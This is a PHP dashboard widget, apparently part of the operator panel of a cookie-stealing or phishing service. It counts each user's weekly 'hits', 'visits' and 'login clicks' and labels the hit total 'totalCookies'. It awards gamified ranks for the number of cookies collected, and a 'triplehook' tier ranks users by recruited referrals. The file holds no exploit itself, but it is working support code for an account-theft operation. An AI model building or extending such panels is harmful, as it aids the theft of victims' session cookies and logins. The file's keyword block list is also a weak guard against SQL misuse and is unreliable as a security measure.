<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (empty($userData) || !is_array($userData) || (int)($userData['link_id'] ?? 0) <= 0) {
    $userData = function_exists('ultimaAuthenticatedRegular') ? ultimaAuthenticatedRegular() : null;
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}
if (!function_exists('dashWidgetQuery')) {
    function dashWidgetQuery($sql, $params = [], $ttl = 60) {
        if (function_exists('ultimaPageQuery')) {
            return ultimaPageQuery($sql, $params, $ttl);
        }
        if (function_exists('executeSafeQuery')) {
            return executeSafeQuery($sql, $params);
        }
        return [];
    }
}


$link_id = (int)$userData['link_id'];
$linkId = $link_id;
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;
$identityData = $userData;

if($isTriplehook){
    $weeklyHitsQuery = "SELECT COUNT(*) as count FROM hits WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id) AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY)";
    $weeklyHitsResult = dashWidgetQuery($weeklyHitsQuery, [':link_id' => $linkId]);
    $weeklyHits = $weeklyHitsResult[0]['count'] ?? 0;

    $weeklyVisitsQuery = "SELECT COUNT(*) as count FROM views WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id) AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY)";
    $weeklyVisitsResult = dashWidgetQuery($weeklyVisitsQuery, [':link_id' => $linkId]);
    $weeklyVisits = $weeklyVisitsResult[0]['count'] ?? 0;

    $weeklyClicksQuery = "SELECT COUNT(*) as count FROM login_clicks WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id) AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY)";
    $weeklyClicksResult = dashWidgetQuery($weeklyClicksQuery, [':link_id' => $linkId]);
    $weeklyClicks = $weeklyClicksResult[0]['count'] ?? 0;

    $totalCookiesQuery = "SELECT COUNT(*) as count FROM hits WHERE link_id IN (SELECT r.link_id FROM regular r WHERE r.referred_by = :link_id)";
    $totalCookiesResult = dashWidgetQuery($totalCookiesQuery, [':link_id' => $linkId]);
    $totalCookies = $totalCookiesResult[0]['count'] ?? 0;

    $referredCountQuery = "SELECT COUNT(*) as count FROM regular WHERE referred_by = :link_id";
    $referredCountResult = dashWidgetQuery($referredCountQuery, [':link_id' => $linkId]);
    $referredCount = $referredCountResult[0]['count'] ?? 0;
}else{
    $weeklyHitsQuery = "SELECT COUNT(*) as count FROM hits WHERE link_id = :link_id AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY)";
    $weeklyHitsResult = dashWidgetQuery($weeklyHitsQuery, [':link_id' => $linkId]);
    $weeklyHits = $weeklyHitsResult[0]['count'] ?? 0;

    $weeklyVisitsQuery = "SELECT COUNT(*) as count FROM views WHERE link_id = :link_id AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY)";
    $weeklyVisitsResult = dashWidgetQuery($weeklyVisitsQuery, [':link_id' => $linkId]);
    $weeklyVisits = $weeklyVisitsResult[0]['count'] ?? 0;

    $weeklyClicksQuery = "SELECT COUNT(*) as count FROM login_clicks WHERE link_id = :link_id AND created_at >= DATE_SUB(CURDATE(), INTERVAL (WEEKDAY(CURDATE())) DAY)";
    $weeklyClicksResult = dashWidgetQuery($weeklyClicksQuery, [':link_id' => $linkId]);
    $weeklyClicks = $weeklyClicksResult[0]['count'] ?? 0;

    $totalCookiesQuery = "SELECT COUNT(*) as count FROM hits WHERE link_id = :link_id";
    $totalCookiesResult = dashWidgetQuery($totalCookiesQuery, [':link_id' => $linkId]);
    $totalCookies = $totalCookiesResult[0]['count'] ?? 0;
}

$ranks = [
    ['name' => 'Unranked', 'min' => 0, 'max' => 10],
    ['name' => 'Walter White', 'min' => 10, 'max' => 25],
    ['name' => 'W. W.', 'min' => 25, 'max' => 50],
    ['name' => 'apple 2023', 'min' => 50, 'max' => 100],
    ['name' => 'apple vip+', 'min' => 100, 'max' => 200],
    ['name' => 'Heisenberg', 'min' => 200, 'max' => 1000],
    ['name' => 'Devil', 'min' => 1000, 'max' => 2000],
    ['name' => 'JOHN WICK', 'min' => 2000, 'max' => 5000],
    ['name' => 'Baba Yaga', 'min' => 5000, 'max' => 10000],
    ['name' => 'NEW APPLE', 'min' => 10000, 'max' => 20000],
    ['name' => 'BIG MAN IN THE HISTORY', 'min' => 20000, 'max' => PHP_INT_MAX],
];

$triplehookRanks = [
    ['name' => 'Unranked', 'min' => 0, 'max' => 10],
    ['name' => 'Triplehook Smaller', 'min' => 10, 'max' => 25],
    ['name' => 'Triple Man', 'min' => 25, 'max' => 50],
    ['name' => 'Tyler Durden', 'min' => 50, 'max' => 100],
    ['name' => 'DON PABLO', 'min' => 100, 'max' => 200],
    ['name' => 'THIS JUST A', 'min' => 200, 'max' => 1000],
    ['name' => 'mustang boss 429', 'min' => 1000, 'max' => 2000],
    ['name' => 'ITS DEVIL', 'min' => 2000, 'max' => 10000],
    ['name' => 'BIG MAN IN THE HISTORY', 'min' => 10000, 'max' => 20000],
    ['name' => 'BACK JUST A BACK', 'min' => 20000, 'max' => PHP_INT_MAX],
];

$currentRank = 'Unranked';
$nextRank = $isTriplehook ? 'Triplehook Smaller' : 'Walter White';
$rankPercent = 0;
$isMaxRank = false;

if ($isTriplehook) {
    $activeRanks = $triplehookRanks;
    $rankMetric = $referredCount;
} else {
    $activeRanks = $ranks;
    $rankMetric = $totalCookies;
}

foreach ($activeRanks as $i => $rank) {
    if ($rankMetric >= $rank['min'] && $rankMetric < $rank['max']) {
        $currentRank = $rank['name'];
        if (isset($activeRanks[$i + 1])) {
            $nextRank = $activeRanks[$i + 1]['name'];
            $rankProgress = $rankMetric - $rank['min'];
            $rankMax = $rank['max'] - $rank['min'];
            $rankPercent = min(100, round(($rankProgress / $rankMax) * 100));
        } else {
            $nextRank = 'MAX';
            $rankPercent = 100;
            $isMaxRank = true;
        }
        break;
    }
}

$storedRank = $userData['user_rank'] ?? 'Unranked';
if ($currentRank !== $storedRank) {
    $updateRankQuery = "UPDATE regular SET user_rank = :rank WHERE link_id = :link_id";
    dashWidgetQuery($updateRankQuery, [':rank' => $currentRank, ':link_id' => $linkId]);
}

$weeklyHitsLabel = $isTriplehook ? "Triplehook Hits" : "Weekly Hits";
$weeklyVisitsLabel = $isTriplehook ? "Triplehook Visits" : "Weekly Visits";
$weeklyClicksLabel = $isTriplehook ? "Triplehook Clicks" : "Weekly Clicks";
$weeklySubtitle = $isTriplehook ? '<span class="weekly-subtitle">(weekly)</span>' : '';

$userAuthCode = $userData['auth_code'] ?? '';
?>
<style>
.user-stats-card{display:flex;flex-direction:column;align-items:center;padding:30px 25px;position:relative;overflow:visible!important}
.user-stats-header{display:flex;flex-direction:column;align-items:center;margin-bottom:25px;width:100%}
.user-stats-avatar{width:80px;height:80px;border-radius:50%;border:none;box-shadow:none;margin-bottom:15px;overflow:hidden;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1)}
.user-stats-avatar img{width:100%;height:100%;object-fit:cover}
.user-stats-avatar i{font-size:2.5rem;color:#fff}
.user-stats-name{font-family:'Rajdhani',sans-serif;font-size:1.4rem;font-weight:700;color:#fff;text-align:center}
.user-stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;margin-bottom:25px}
.user-stat-item{text-align:center;padding:12px;background:rgba(255,215,0,0.05);border-radius:10px;border:1px solid rgba(255,215,0,0.2);transition:all 0.3s ease}
.user-stat-item-plain{text-align:center;padding:8px;background:transparent;transition:all 0.3s ease}
.user-stat-item:hover,.user-stat-item-plain:hover{transform:translateY(-2px)}
.user-stat-label{font-size:0.75rem;color:#888;margin-bottom:6px;font-weight:500}
.weekly-subtitle{display:block;font-size:0.6rem;color:rgba(255,255,255,0.3);margin-bottom:2px;font-weight:400;letter-spacing:0.5px}
.user-stat-value{font-family:'Rajdhani',sans-serif;font-size:1.5rem;font-weight:700;color:#fff}
.user-rank-section{width:100%;padding:20px;background:transparent;border-radius:12px;border:none;overflow:visible}
.current-rank{text-align:center;margin-bottom:15px;font-size:0.95rem}
.rank-label{color:#888}
.rank-value{color:#ff4444;font-weight:700;font-size:1.1rem;margin-left:5px;text-shadow:0 0 10px rgba(255,68,68,0.5)}
.rank-progress{margin-bottom:15px;overflow:visible}
.rank-progress-text{font-size:0.8rem;color:#888;text-align:center;margin-bottom:8px}
.rank-progress-bar{width:100%;height:8px;background:rgba(255,68,68,0.1);border-radius:10px;overflow:visible;position:relative}
.rank-progress-fill{height:100%;background:linear-gradient(90deg,#ff4444,#ff6b6b);border-radius:10px;transition:width 0.5s ease;position:relative;overflow:visible}
.spark-particle{position:absolute;border-radius:50%;pointer-events:none;will-change:transform,opacity}
.next-rank{text-align:center;font-size:0.9rem;color:#aaa}
.next-rank span{color:#ff4444;font-weight:600;text-shadow:0 0 10px rgba(255,68,68,0.5)}
.rank-max{color:#ff4444;font-weight:700;text-shadow:0 0 15px rgba(255,68,68,0.7);animation:glow 2s ease-in-out infinite}
.referred-count{text-align:center;margin-bottom:10px;font-size:0.85rem;color:#888}
.referred-count span{color:#fff;font-weight:600}

.hide-avatar-box{position:absolute;top:12px;right:12px;width:32px;height:32px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.3s ease}
.hide-avatar-box:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.2)}
.hide-avatar-box svg{width:16px;height:16px;stroke:#666;stroke-width:2;fill:none;transition:all 0.3s ease}
.hide-avatar-box:hover svg{stroke:#999}
.hide-avatar-box .eye-slash{display:block}
.hide-avatar-box.active .eye-slash{display:none}
.hide-avatar-box.active svg{stroke:#888}

.auth-key-box{position:absolute;top:12px;right:50px;width:32px;height:32px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.3s ease}
.auth-key-box:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.2)}
.auth-key-box svg{width:16px;height:16px;stroke:#666;stroke-width:2;fill:none;transition:all 0.3s ease}
.auth-key-box:hover svg{stroke:#999}
.auth-popup{position:absolute;top:50px;right:12px;background:rgba(10,10,14,0.95);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);border:1px solid rgba(255,255,255,0.1);border-radius:10px;padding:14px 16px;z-index:100;opacity:0;transform:translateY(-8px);pointer-events:none;transition:all 0.25s ease;min-width:200px;max-width:280px}
.auth-popup.show{opacity:1;transform:translateY(0);pointer-events:auto}
.auth-popup-label{font-size:0.7rem;color:#666;letter-spacing:0.5px;margin-bottom:8px;font-weight:500}
.auth-popup-code{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:6px;padding:8px 10px}
.auth-popup-code span{font-family:'Rajdhani',monospace;font-size:0.85rem;color:rgba(255,255,255,0.7);word-break:break-all;flex:1}
.auth-popup-copy{background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;transition:all 0.2s ease}
.auth-popup-copy svg{width:14px;height:14px;stroke:#666;stroke-width:2;fill:none}
.auth-popup-copy:hover svg{stroke:#fff}

@keyframes glow{0%,100%{text-shadow:0 0 10px rgba(255,68,68,0.5)}50%{text-shadow:0 0 20px rgba(255,68,68,0.8),0 0 30px rgba(255,68,68,0.6)}}

@media(max-width:900px){
    .user-stats-grid{grid-template-columns:repeat(3,1fr)}
}

@media(max-width:768px){
    .user-stats-card{padding:20px 15px}
    .user-stats-avatar{width:70px;height:70px}
    .user-stats-avatar i{font-size:2rem}
    .user-stats-name{font-size:1.2rem}
    .user-stats-grid{gap:8px}
    .user-stat-item-plain{padding:6px}
    .user-stat-label{font-size:0.7rem}
    .user-stat-value{font-size:1.2rem}
    .user-rank-section{padding:15px}
    .current-rank{font-size:0.85rem}
    .rank-value{font-size:1rem}
    .hide-avatar-box{top:10px;right:10px;width:28px;height:28px}
    .hide-avatar-box svg{width:14px;height:14px}
    .auth-key-box{top:10px;right:44px;width:28px;height:28px}
    .auth-key-box svg{width:14px;height:14px}
    .auth-popup{right:10px;top:44px}
}

@media(max-width:480px){
    .user-stats-card{padding:15px 10px}
    .user-stats-avatar{width:60px;height:60px;margin-bottom:10px}
    .user-stats-header{margin-bottom:15px}
    .user-stats-name{font-size:1.1rem}
    .user-stats-grid{gap:6px;margin-bottom:15px}
    .user-stat-value{font-size:1.1rem}
    .rank-progress-bar{height:6px}
    .next-rank{font-size:0.8rem}
    .hide-avatar-box{top:8px;right:8px;width:26px;height:26px}
    .auth-key-box{top:8px;right:40px;width:26px;height:26px}
    .auth-popup{right:8px;top:40px;min-width:180px}
}
</style>
<?php
function getAvatarUrlUS($avatar, $discordId) {
    if (empty($avatar)) return '';
    if (strpos($avatar, '/images/') === 0) return $avatar;
    if (strpos($avatar, 'https://') === 0) return $avatar;
    if (empty($discordId)) return '';
    $ext = (strpos($avatar, 'a_') === 0) ? 'gif' : 'png';
    return 'https://cdn.discordapp.com/avatars/' . $discordId . '/' . $avatar . '.' . $ext;
}

$currentUsername = trim((string)($identityData['discord_username'] ?? ''));
$discordAvatar = trim((string)($identityData['discord_avatar'] ?? ''));
$discordId = $identityData['discord_id'] ?? '';
$storedOriginalUsername = trim((string)($identityData['original_username'] ?? ''));
$storedOriginalAvatar = trim((string)($identityData['original_avatar'] ?? ''));
$displayLooksHidden = strcasecmp($currentUsername, 'Anonymous') === 0
    || stripos($discordAvatar, 'hide.png') !== false
    || (int)($identityData['avatar_hidden'] ?? 0) === 1;

$originalUsername = $storedOriginalUsername;
if ($originalUsername === '' || strcasecmp($originalUsername, 'Anonymous') === 0) {
    $originalUsername = (strcasecmp($currentUsername, 'Anonymous') !== 0 && $currentUsername !== '')
        ? $currentUsername
        : '';
}
if ($originalUsername === '' || strcasecmp($originalUsername, 'Anonymous') === 0) {
    $originalUsername = 'User';
}

$originalAvatarRaw = $storedOriginalAvatar;
if ($originalAvatarRaw === '' || stripos($originalAvatarRaw, 'hide.png') !== false) {
    $originalAvatarRaw = stripos($discordAvatar, 'hide.png') === false ? $discordAvatar : '';
}

$originalAvatarUrl = getAvatarUrlUS($originalAvatarRaw, $discordId);
$discordUsername = $currentUsername !== '' ? $currentUsername : 'User';
$avatarUrl = getAvatarUrlUS($discordAvatar, $discordId);
$isAvatarHidden = $displayLooksHidden;
?>
<div class="card user-stats-card<?=$isAvatarHidden ? ' is-avatar-hidden' : ''?>" id="user-stats-card" data-original-avatar="<?=htmlspecialchars($originalAvatarUrl, ENT_QUOTES)?>" data-hidden-avatar="/images/hide.png" data-original-username="<?=htmlspecialchars($originalUsername, ENT_QUOTES)?>">
    <div class="hide-avatar-box <?=$isAvatarHidden ? '' : 'active'?>" id="hideAvatarBtn" title="Toggle Avatar Visibility" data-hidden="<?=$isAvatarHidden ? '1' : '0'?>" aria-pressed="<?=$isAvatarHidden ? 'true' : 'false'?>">
        <svg viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
            <line class="eye-slash" x1="1" y1="1" x2="23" y2="23"/>
        </svg>
    </div>
    <div class="auth-key-box" id="authKeyBtn" title="Show Auth Code">
        <svg viewBox="0 0 24 24">
            <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>
        </svg>
    </div>
    <div class="auth-popup" id="authPopup">
        <div class="auth-popup-label">YOUR AUTH CODE</div>
        <div class="auth-popup-code">
            <span id="authCodeText"><?=htmlspecialchars($userAuthCode)?></span>
            <button class="auth-popup-copy" id="authCopyBtn" title="Copy">
                <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </button>
        </div>
    </div>
    <div class="user-stats-header">
        <div class="user-stats-avatar" id="userAvatarContainer">
            <?php if(!empty($avatarUrl)): ?>
            <img src="<?=htmlspecialchars($avatarUrl)?>" alt="" id="userAvatarImg">
            <?php else: ?><i class="fab fa-discord"></i><?php endif; ?>
        </div>
        <div class="user-stats-name" id="userStatsDisplayName"><?=htmlspecialchars($discordUsername)?></div>
    </div>
    <div class="user-stats-grid">
        <div class="user-stat-item-plain"><div class="user-stat-label" data-user-stats-label="hits"><?=$weeklySubtitle?><?=$weeklyHitsLabel?></div><div class="user-stat-value counter-animate" data-user-stats-metric="weekly_hits" data-target="<?=$weeklyHits?>">0</div></div>
        <div class="user-stat-item-plain"><div class="user-stat-label" data-user-stats-label="visits"><?=$weeklySubtitle?><?=$weeklyVisitsLabel?></div><div class="user-stat-value counter-animate" data-user-stats-metric="weekly_visits" data-target="<?=$weeklyVisits?>">0</div></div>
        <div class="user-stat-item-plain"><div class="user-stat-label" data-user-stats-label="clicks"><?=$weeklySubtitle?><?=$weeklyClicksLabel?></div><div class="user-stat-value counter-animate" data-user-stats-metric="weekly_clicks" data-target="<?=$weeklyClicks?>">0</div></div>
    </div>
    <div class="user-rank-section">
        <div class="referred-count" id="userStatsReferred"<?=$isTriplehook ? '' : ' hidden'?>>Referred Users: <span id="userStatsReferredCount"><?=$referredCount ?? 0?></span></div>
        <div class="current-rank">
            <span class="rank-label">Current Rank -</span>
            <span class="rank-value <?=$isMaxRank ? 'rank-max' : ''?>" id="userStatsRankValue"><?=$currentRank?></span>
        </div>
        <div class="rank-progress">
            <div class="rank-progress-text" id="userStatsRankProgressText"><?=$rankPercent?>% to Rank Up!</div>
            <div class="rank-progress-bar"><div class="rank-progress-fill" id="userStatsRankProgressFill" style="width:<?=$rankPercent?>%"></div></div>
        </div>
        <?php if (!$isMaxRank): ?>
        <div class="next-rank">Next Rank &rarr; <span><?=htmlspecialchars($nextRank)?></span></div>
        <?php else: ?>
        <div class="next-rank"><span class="rank-max">&#127942; MAX RANK ACHIEVED! &#127942;</span></div>
        <?php endif; ?>
    </div>
</div>
<script>
(function() {
    document.querySelectorAll('.counter-animate').forEach(function(counter) {
        const target = parseInt(counter.getAttribute('data-target')) || 0;
        if (target === 0) return;
        
        const duration = 1000;
        const steps = Math.min(target, 60);
        const stepDuration = duration / steps;
        const increment = target / steps;
        let current = 0;
        
        const timer = setInterval(function() {
            current += increment;
            if (current >= target) {
                counter.textContent = target.toLocaleString();
                clearInterval(timer);
            } else {
                counter.textContent = Math.floor(current).toLocaleString();
            }
        }, stepDuration);
    });
    var userStatsCard = document.getElementById('user-stats-card');
    var hideBtn = document.getElementById('hideAvatarBtn');
    function setAvatarVisibility(hidden, profile) {
        if (!userStatsCard) return;
        profile = profile || {};
        hidden = hidden === true || hidden === 1 || hidden === '1';
        if (profile.original_avatar_url) userStatsCard.setAttribute('data-original-avatar', profile.original_avatar_url);
        if (profile.original_username && profile.original_username !== 'Anonymous') userStatsCard.setAttribute('data-original-username', profile.original_username);
        var originalAvatar = userStatsCard.getAttribute('data-original-avatar') || '';
        var hiddenAvatar = userStatsCard.getAttribute('data-hidden-avatar') || '/images/hide.png';
        var originalUsername = userStatsCard.getAttribute('data-original-username') || 'User';
        var responseAvatar = profile.avatar_url || profile.avatarUrl || '';
        var responseUsername = profile.discord_username || profile.username || '';
        var displayAvatar = hidden ? hiddenAvatar : (responseAvatar || originalAvatar);
        var displayUsername = hidden ? 'Anonymous' : (responseUsername || originalUsername);
        var avatarContainer = document.getElementById('userAvatarContainer');
        var avatarImage = document.getElementById('userAvatarImg');
        if (avatarContainer) {
            if (displayAvatar) {
                if (!avatarImage) {
                    avatarImage = document.createElement('img');
                    avatarImage.id = 'userAvatarImg';
                    avatarImage.alt = '';
                    avatarContainer.innerHTML = '';
                    avatarContainer.appendChild(avatarImage);
                }
                avatarImage.src = displayAvatar;
            } else if (avatarImage) {
                avatarImage.remove();
                avatarContainer.innerHTML = '<i class="fab fa-discord"></i>';
            }
        }
        var name = document.getElementById('userStatsDisplayName');
        if (name) name.textContent = displayUsername;
        userStatsCard.classList.toggle('is-avatar-hidden', hidden);
        if (hideBtn) {
            hideBtn.setAttribute('data-hidden', hidden ? '1' : '0');
            hideBtn.setAttribute('aria-pressed', hidden ? 'true' : 'false');
            hideBtn.classList.toggle('active', !hidden);
            hideBtn.title = hidden ? 'Show Avatar' : 'Hide Avatar';
        }
        var detail = {
            hidden: hidden,
            username: displayUsername,
            avatarUrl: displayAvatar,
            originalAvatar: originalAvatar,
            hiddenAvatar: hiddenAvatar,
            originalUsername: originalUsername
        };
        if (typeof window.ultimaSetAvatarVisibility === 'function') window.ultimaSetAvatarVisibility(detail);
        window.dispatchEvent(new CustomEvent('ultima:avatar-visibility', {detail:detail}));
    }
    if (hideBtn) {
        hideBtn.addEventListener('click', function() {
            if (this.dataset.saving === '1') return;
            var isHidden = this.getAttribute('data-hidden') === '1';
            var newState = isHidden ? 0 : 1;
            this.dataset.saving = '1';
            this.style.pointerEvents = 'none';
            fetch('/api/toggle-avatar.php', {
                method: 'POST',
                cache: 'no-store',
                credentials: 'same-origin',
                headers: {'Content-Type': 'application/json', 'Cache-Control': 'no-store'},
                body: JSON.stringify({hide: newState})
            })
            .then(function(r) { return r.json(); })
            .then(function(d) {
                if (d && d.success) {
                    setAvatarVisibility(d.hidden, d);
                }
            })
            .catch(function() {})
            .then(function() {
                hideBtn.dataset.saving = '0';
                hideBtn.style.pointerEvents = '';
            });
        });
    }

    var authBtn = document.getElementById('authKeyBtn');
    var authPopup = document.getElementById('authPopup');
    if (authBtn && authPopup) {
        authBtn.addEventListener('click', function(e) {
            e.stopPropagation();
            authPopup.classList.toggle('show');
        });
        document.addEventListener('click', function(e) {
            if (!authPopup.contains(e.target) && e.target !== authBtn && !authBtn.contains(e.target)) {
                authPopup.classList.remove('show');
            }
        });
        var copyBtn = document.getElementById('authCopyBtn');
        if (copyBtn) {
            copyBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                var code = document.getElementById('authCodeText').textContent;
                navigator.clipboard.writeText(code).then(function() {
                    copyBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12" style="stroke:#22c55e;stroke-width:2;fill:none"/></svg>';
                    setTimeout(function() {
                        copyBtn.innerHTML = '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
                    }, 1500);
                });
            });
        }
    }
})();

(function(){
    var fill = document.querySelector('.rank-progress-fill');
    if(!fill || parseFloat(fill.style.width) === 0) return;
    var bar = fill.parentElement;
    bar.style.overflow = 'visible';
    var colors = ['#ff4444','#ff5555','#ff6b6b'];
    function spawnSpark(){
        var rect = fill.getBoundingClientRect();
        var barRect = bar.getBoundingClientRect();
        var tipX = rect.right - barRect.left;
        var tipY = rect.top + rect.height / 2 - barRect.top;
        var p = document.createElement('div');
        p.className = 'spark-particle';
        var size = Math.random() * 1.5 + 1.5;
        var color = colors[Math.floor(Math.random() * colors.length)];
        var vx = -(0.8 + Math.random() * 1.5);
        var vy = -(0.3 + Math.random() * 1.8);
        if(Math.random() > 0.5) vy = (0.3 + Math.random() * 1.2);
        p.style.cssText = 'width:'+size+'px;height:'+size+'px;background:'+color+';position:absolute;left:'+tipX+'px;top:'+tipY+'px;border-radius:50%;pointer-events:none;box-shadow:0 0 3px '+color+';opacity:0.85;z-index:10';
        bar.appendChild(p);
        var x = 0, y = 0, opacity = 0.85, life = 0;
        function animate(){
            life++;
            x += vx;
            y += vy;
            vy += 0.04;
            opacity -= 0.025;
            if(opacity <= 0 || life > 35){
                if(p.parentNode) p.parentNode.removeChild(p);
                return;
            }
            p.style.transform = 'translate('+x+'px,'+y+'px)';
            p.style.opacity = opacity;
            requestAnimationFrame(animate);
        }
        requestAnimationFrame(animate);
    }
    setInterval(function(){
        spawnSpark();
        if(Math.random() > 0.5) setTimeout(spawnSpark, 100 + Math.random() * 150);
    }, 450);
})();
</script>
<script>
(function(){
    var card=document.getElementById('user-stats-card');
    if(!card)return;
    function own(object,key){return Object.prototype.hasOwnProperty.call(object,key);}
    function number(value){return (parseInt(value,10)||0).toLocaleString();}
    function updateMetric(name,value){
        var element=card.querySelector('[data-user-stats-metric="'+name+'"]');
        if(!element)return;
        if(typeof window.dashboardAnimateNumber==='function')window.dashboardAnimateNumber(element,value,'',true);
        else element.textContent=number(value);
        element.setAttribute('data-target',String(parseInt(value,10)||0));
    }
    function updateLabels(isTriplehook){
        var labels=isTriplehook?{
            hits:'<span class="weekly-subtitle">(weekly)</span>Triplehook Hits',
            visits:'<span class="weekly-subtitle">(weekly)</span>Triplehook Visits',
            clicks:'<span class="weekly-subtitle">(weekly)</span>Triplehook Clicks'
        }:{hits:'Weekly Hits',visits:'Weekly Visits',clicks:'Weekly Clicks'};
        Object.keys(labels).forEach(function(key){
            var label=card.querySelector('[data-user-stats-label="'+key+'"]');
            if(label)label.innerHTML=labels[key];
        });
    }
    function apply(data){
        if(!data)return;
        if(own(data,'weekly_hits'))updateMetric('weekly_hits',data.weekly_hits);
        if(own(data,'weekly_visits'))updateMetric('weekly_visits',data.weekly_visits);
        if(own(data,'weekly_clicks'))updateMetric('weekly_clicks',data.weekly_clicks);
        if(own(data,'is_triplehook')){
            var triple=!!data.is_triplehook;
            card.setAttribute('data-triplehook',triple?'1':'0');
            updateLabels(triple);
            var referred=document.getElementById('userStatsReferred');
            if(referred)referred.hidden=!triple;
        }
        if(own(data,'referred_count')){
            var referredCount=document.getElementById('userStatsReferredCount');
            if(referredCount)referredCount.textContent=number(data.referred_count);
        }
        if(data.rank){
            var rank=data.rank,rankValue=document.getElementById('userStatsRankValue');
            if(rankValue){rankValue.textContent=rank.current||'Unranked';rankValue.classList.toggle('rank-max',!!rank.is_max);}
            var progress=document.getElementById('userStatsRankProgressText');
            if(progress)progress.textContent=(parseInt(rank.percent,10)||0)+'% to Rank Up!';
            var fill=document.getElementById('userStatsRankProgressFill');
            if(fill)fill.style.width=(parseInt(rank.percent,10)||0)+'%';
                        var next=card.querySelector('.next-rank');
            if(next){
                if(rank.is_max)next.innerHTML='<span class="rank-max">&#127942; MAX RANK ACHIEVED! &#127942;</span>';
                else next.innerHTML='Next Rank &rarr; <span>'+String(rank.next||'').replace(/[&<>"']/g,function(ch){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[ch];})+'</span>';
            }
        }
    }
    window.updateUserStatsLive=apply;
    window.addEventListener('dashboard:stats',function(event){
        var payload=event&&event.detail;
        if(payload&&payload.user_stats)apply(payload.user_stats);
    });
})();
</script>
